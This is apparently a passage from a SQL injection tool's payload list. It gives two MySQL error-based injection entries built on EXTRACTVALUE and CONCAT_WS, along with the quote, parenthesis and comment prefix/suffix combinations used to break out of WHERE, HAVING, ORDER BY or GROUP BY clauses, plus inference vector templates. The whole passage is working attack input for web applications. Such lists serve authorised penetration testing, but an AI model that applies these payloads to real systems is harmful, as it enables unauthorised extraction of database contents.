            {
                "payload": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": "(", "suf": ")"},
                    {"pref": " AND ", "suf": "-- wXyW"},
                    {"pref": " AND ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' AND ", "suf": "-- wXyW"},
                    {"pref": "' AND ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" AND ', "suf": "-- wXyW"},
                    {"pref": '" AND ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") AND ", "suf": "-- wXyW"},
                    {"pref": ") AND ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') AND ", "suf": "-- wXyW"},
                    {"pref": "') AND ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") AND ', "suf": "-- wXyW"},
                    {"pref": '") AND ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
                "vector": "EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
                "dbms": "MySQL",
            },
            {
                "payload": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,0x72306f746833783439,0x7e))",
                "comments": [
                    # {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": " ", "suf": "#"},
                    # {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "#"},
                    # {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "#"},
                    # {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "#"},
                    # {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "#"},
                    # {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "#"},
                ],
                "title": "MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)",
                "vector": "OR EXTRACTVALUE(0,CONCAT_WS(0x28,0x7e,[INFERENCE],0x7e))",
                "dbms": "MySQL",
            },
            
        ],
    }
}